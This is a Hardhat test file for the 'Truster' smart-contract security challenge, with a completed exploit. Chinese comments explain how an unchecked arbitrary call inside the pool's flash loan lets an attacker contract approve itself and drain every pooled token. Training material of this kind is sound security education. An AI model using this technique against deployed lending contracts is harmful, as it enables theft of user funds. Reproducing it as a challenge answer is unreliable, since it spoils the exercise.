const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Truster", function () {
  let deployer, attacker;

  const TOKENS_IN_POOL = ethers.utils.parseEther("1000000");

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    const DamnValuableToken = await ethers.getContractFactory(
      "DamnValuableToken",
      deployer
    );
    const TrusterLenderPool = await ethers.getContractFactory(
      "TrusterLenderPool",
      deployer
    );

    this.token = await DamnValuableToken.deploy();
    this.pool = await TrusterLenderPool.deploy(this.token.address);

    await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

    expect(await this.token.balanceOf(this.pool.address)).to.equal(
      TOKENS_IN_POOL
    );

    expect(await this.token.balanceOf(attacker.address)).to.equal("0");
  });

  it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE  */
    /**
     * solution:
     * TrusterLenderPool 沒有檢查 target address 就直接執行 functionCall，我們可以另外寫一個合約去呼叫flashLoan，執行 ERC20 token approve function 允許 attacker 轉移 pool 中所有餘額。
     */

    const TrusterLenderPoolAttacker = await ethers.getContractFactory(
      "TrusterLenderPoolAttacker",
      deployer
    );

    this.attackerContract = await TrusterLenderPoolAttacker.deploy(
      this.pool.address,
      this.token.address
    );
    // attackerContract 打 flashLoan，讓 attacker 有權限轉移 pool 的餘額
    await this.attackerContract.attack();

    // 已經允許 attacker 轉移 pool 的餘額，我們可以直接轉帳
    await this.token.transferFrom(
      this.pool.address,
      attacker.address,
      TOKENS_IN_POOL
    );
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // Attacker has taken all tokens from the pool
    expect(await this.token.balanceOf(attacker.address)).to.equal(
      TOKENS_IN_POOL
    );
    expect(await this.token.balanceOf(this.pool.address)).to.equal("0");
  });
});
